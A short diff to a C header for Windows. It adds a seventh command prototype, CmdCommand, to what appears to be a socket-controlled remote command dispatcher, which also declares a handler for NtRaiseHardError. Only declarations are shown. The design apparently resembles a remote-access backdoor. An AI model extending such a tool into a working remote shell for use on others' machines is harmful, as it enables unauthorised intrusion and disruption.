@@ -2,7 +2,7 @@
 
 #include <Windows.h>
 
-#define N_COMMANDS 6
+#define N_COMMANDS 7
 
 typedef BOOL (*CommandProc)(SOCKET*, PSTR);
 typedef struct _s_Command {
@@ -19,3 +19,4 @@ BOOL ReplyCommand(SOCKET*, PSTR);
 BOOL NtRaiseHardErrorCommand(SOCKET*);
 BOOL ChangeDirectoryCommand(SOCKET*, PSTR);
 BOOL GetCwdCommand(SOCKET*);
+BOOL CmdCommand(SOCKET*, PSTR);
